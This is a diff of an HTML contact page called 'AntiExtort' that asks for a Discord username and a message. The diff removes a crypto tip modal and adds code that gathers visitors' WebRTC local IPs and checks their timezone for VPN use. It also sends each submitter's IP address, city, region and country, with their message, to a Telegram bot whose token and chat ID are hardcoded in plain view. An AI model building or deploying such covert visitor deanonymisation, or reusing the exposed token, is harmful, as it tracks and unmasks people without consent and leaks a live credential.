@@ -46,18 +46,16 @@
     h1 {
       font-size: 3rem;
       text-align: center;
-      position: relative;
       margin-bottom: 2rem;
       letter-spacing: 0.1em;
       text-transform: uppercase;
       text-shadow: 2px 0 white, -2px 0 white;
     }
 
-    input,
-    textarea {
+    input, textarea {
       width: 100%;
       padding: 0.9rem 1rem;
-      margin-bottom: 1.2rem;
+      margin-bottom: 1rem;
       border: 1px solid white;
       background: rgba(255, 255, 255, 0.1);
       color: white;
@@ -65,7 +63,6 @@
       font-family: 'Courier New', Courier, monospace;
       border-radius: 4px;
       outline: none;
-      resize: vertical;
     }
 
     button {
@@ -79,203 +76,185 @@
       font-family: 'Courier New', Courier, monospace;
       border-radius: 6px;
       cursor: pointer;
-      transition: all 0.3s ease;
+      transition: 0.3s ease;
     }
 
-    button:hover {
-      background: white;
-      color: black;
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
     }
 
     .success {
-      color: white;
       text-align: center;
+      margin-top: 1rem;
       font-weight: bold;
-      margin-top: 1rem;
     }
 
-    #clock {
-      font-size: 1rem;
-      margin-top: 1rem;
-      text-shadow: 0 0 3px white;
+    #clock, #submissionsToday, #tzWarning {
       text-align: center;
-      user-select: none;
-    }
-
-    /* Tip Modal Styles */
-    .modal-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(0, 0, 0, 0.85);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-      backdrop-filter: blur(5px);
-    }
-
-    .modal-content {
-      background-color: rgba(0, 0, 0, 0.9);
-      border: 1px solid white;
-      padding: 2rem;
-      width: 90%;
-      max-width: 400px;
-      box-shadow: 0 0 10px white, 0 0 20px white inset;
-      border-radius: 8px;
-      box-sizing: border-box;
-      text-align: center;
-      color: white;
-      font-family: 'Courier New', Courier, monospace;
-      position: relative;
-    }
-
-    .modal-content h2 {
-      font-size: 2.5rem;
-      margin-bottom: 1rem;
-      letter-spacing: 0.1em;
-      text-transform: uppercase;
-      text-shadow: 2px 0 white, -2px 0 white;
-    }
-
-    .wallet-address {
+      margin-top: 0.5rem;
       font-size: 1rem;
-      word-break: break-word;
-      margin-bottom: 1.5rem;
-      background: rgba(255, 255, 255, 0.1);
-      padding: 0.8rem;
-      border-radius: 4px;
-      user-select: all;
+    }
+
+    #webrtcIPs {
+      margin-top: 0.5rem;
+      font-size: 0.9rem;
+      color: #bbb;
+      text-align: center;
       font-family: monospace;
-    }
-
-    .qr-code {
-      width: 250px;
-      height: 250px;
-      margin-bottom: 1.5rem;
-      filter: drop-shadow(0 0 2px white);
-    }
-
-    .close-button {
-      position: absolute;
-      top: 10px;
-      right: 15px;
-      background: transparent;
-      border: none;
-      color: white;
-      font-size: 2rem;
-      cursor: pointer;
-      font-weight: 900;
-      line-height: 1;
-    }
-
-    .close-button:hover {
-      color: #ccc;
     }
   </style>
 </head>
 <body>
-  <div class="container" role="main">
-    <h1>ANTI EXTORT OWN'S YOU</h1>
-    <label for="discord" style="display:none;">Discord Username</label>
-    <input
-      type="text"
-      id="discord"
-      name="discord"
-      placeholder="Discord Username (e.g., user)"
-      autocomplete="off"
-      aria-required="true"
-      aria-describedby="discordHelp"
-    />
-    <span id="discordHelp" style="font-size:0.8rem; color:#ccc; display:block; margin-bottom:1rem;">
-      Enter your Discord @username
-    </span>
-    <label for="message" style="display:none;">Message</label>
-    <textarea
-      id="message"
-      name="message"
-      placeholder="What do you need?"
-      rows="5"
-      aria-required="true"
-    ></textarea>
-    <button type="button" onclick="sendMessage()">Send</button>
-    <p id="response" class="success" style="display: none;" role="alert" aria-live="polite"></p>
-    <div id="clock" aria-live="polite" aria-atomic="true" aria-label="Local time"></div>
-  </div>
+  <div class="container">
+    <h1>AntiExtort</h1>
+    <input type="text" id="discord" placeholder="Discord Username (e.g., user)" autocomplete="off" />
+    <textarea id="message" placeholder="What do you need?" rows="5"></textarea>
 
-  <button class="tip-button" aria-label="Open tip page" onclick="openTipModal()">Click Me</button>
-
-  <!-- Tip Modal -->
-  <div class="modal-overlay" id="tipModal" role="dialog" aria-modal="true" aria-labelledby="tipModalTitle" tabindex="-1">
-    <div class="modal-content">
-      <button class="close-button" aria-label="Close tip modal" onclick="closeTipModal()">&times;</button>
-      <h2 id="tipModalTitle">DonateBrokie</h2>
-      <div class="wallet-address" id="walletAddress">Be8i5YQ4pYdWnUx6kupW1Y5BLKJdNmoErM3HCHuKCEsc</div>
-      <img
-        class="qr-code"
-        id="qrCode"
-        alt="QR Code for Wallet"
-        src=""
-        aria-label="QR code of Tether SOL wallet address"
-      />
-      <button onclick="closeTipModal()">Back</button>
-    </div>
+    <button id="sendBtn" onclick="sendMessage()">Send</button>
+    <p id="response" class="success" style="display: none;"></p>
+    <div id="clock"></div>
+    <div id="tzWarning"></div>
+    <div id="submissionsToday">Submissions today: 0</div>
+    <div id="webrtcIPs"></div>
   </div>
 
 <script>
 const TELEGRAM_BOT_TOKEN = '8395760817:AAFe1M_YCXdqxDpno5EKNJ4PairARNQV1ts';
 const TELEGRAM_CHAT_ID = '6037000451';
 
+let submissionCount = 0;
+let localIPs = [];
+
+function startCooldown() {
+  const button = document.getElementById("sendBtn");
+  button.disabled = true;
+  let seconds = 60;
+  button.innerText = `Wait ${seconds}s`;
+
+  const interval = setInterval(() => {
+    seconds--;
+    button.innerText = `Wait ${seconds}s`;
+    if (seconds <= 0) {
+      clearInterval(interval);
+      button.disabled = false;
+      button.innerText = "Send";
+    }
+  }, 1000);
+}
+
+function updateClock() {
+  const now = new Date();
+  document.getElementById("clock").innerText = "🕒 Local Time: " + now.toLocaleTimeString();
+}
+setInterval(updateClock, 1000);
+updateClock();
+
+// Basic timezone mismatch check
+(function timezoneFingerprintCheck() {
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+      const tz = data.timezone;
+      const mismatch = !Intl.DateTimeFormat().resolvedOptions().timeZone.includes(tz);
+      if (mismatch) {
+        document.getElementById("tzWarning").innerText = "⚠️ Timezone mismatch detected (VPN?)";
+      }
+    });
+})();
+
+// WebRTC Leak IP detection
+async function getLocalIPs() {
+  return new Promise((resolve, reject) => {
+    const ips = new Set();
+    try {
+      const pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel('');
+      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(e => reject(e));
+      pc.onicecandidate = (ice) => {
+        if (!ice || !ice.candidate) {
+          if (ips.size === 0) resolve([]);
+          return;
+        }
+        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+        const ipMatch = ipRegex.exec(ice.candidate.candidate);
+        if (ipMatch) {
+          ips.add(ipMatch[1]);
+          document.getElementById("webrtcIPs").innerText = `🕵️ WebRTC Local IPs: ${[...ips].join(", ")}`;
+          resolve([...ips]);
+        }
+      };
+    } catch(e) {
+      reject(e);
+    }
+  });
+}
+
+// Get WebRTC IPs on load
+getLocalIPs().then(ips => {
+  localIPs = ips;
+}).catch(() => {
+  document.getElementById("webrtcIPs").innerText = "🕵️ WebRTC IP detection not supported";
+});
+
 async function sendMessage() {
-  const discord = document.getElementById('discord').value.trim();
-  const message = document.getElementById('message').value.trim();
-  const responseEl = document.getElementById('response');
-  
-  responseEl.style.display = 'none';
-  
+  const discord = document.getElementById("discord").value.trim();
+  const message = document.getElementById("message").value.trim();
+  const responseEl = document.getElementById("response");
+
   if (!discord || !message) {
-    alert('Please fill out all fields.');
+    alert("Please fill out all fields.");
     return;
   }
 
   try {
-    // Fetch user's IP + location info at submit time
-    const ipRes = await fetch('https://ipapi.co/json/');
+    const ipRes = await fetch("https://ipapi.co/json/");
     const ipData = await ipRes.json();
 
-    const locationInfo = `🌍 *IP Info:*\nIP: ${ipData.ip}\nCity: ${ipData.city}\nRegion: ${ipData.region}\nCountry: ${ipData.country_name}\nTimezone: ${ipData.timezone}`;
+    const locationInfo = `🌍 *IP Info:*
+IP: ${ipData.ip}
+City: ${ipData.city}
+Region: ${ipData.region}
+Country: ${ipData.country_name}
+Timezone: ${ipData.timezone}`;
 
-    const text = `🚨 *ExtortAlert @larpinglarps:*\n👤 *Discord:* ${discord}\n💬 *Message:* ${message}\n\n${locationInfo}`;
+    let webrtcInfo = "";
+    if (localIPs.length > 0) {
+      webrtcInfo = `\n🕵️ *WebRTC Local IP Leak(s):*\n${localIPs.join(", ")}`;
+    } else {
+      webrtcInfo = `\n🕵️ *WebRTC Local IP Leak(s):* None detected or not supported`;
+    }
+
+    const text = `🚨 *New Submission*
+👤 *Discord:* ${discord}
+💬 *Message:* ${message}
+
+${locationInfo}${webrtcInfo}`;
 
     const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: text,
-        parse_mode: 'Markdown'
-      }),
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "Markdown" }),
     });
 
     const data = await res.json();
-
     if (data.ok) {
-      responseEl.textContent = '✅ Message sent to Telegram!';
-      responseEl.style.display = 'block';
-      document.getElementById('discord').value = '';
-      document.getElementById('message').value = '';
+      submissionCount++;
+      document.getElementById("submissionsToday").innerText = `Submissions today: ${submissionCount}`;
+      responseEl.innerText = "✅ Message sent to Telegram!";
+      responseEl.style.display = "block";
+      document.getElementById("discord").value = '';
+      document.getElementById("message").value = '';
+      startCooldown();
     } else {
-      responseEl.textContent = `❌ Telegram error: ${data.description}`;
-      responseEl.style.display = 'block';
+      responseEl.innerText = `❌ Telegram error: ${data.description}`;
+      responseEl.style.display = "block";
     }
   } catch (err) {
-    responseEl.textContent = '❌ Network error occurred.';
-    responseEl.style.display = 'block';
+    responseEl.innerText = "❌ Network error occurred.";
+    responseEl.style.display = "block";
   }
 }
 </script>
-
 </body>
 </html>
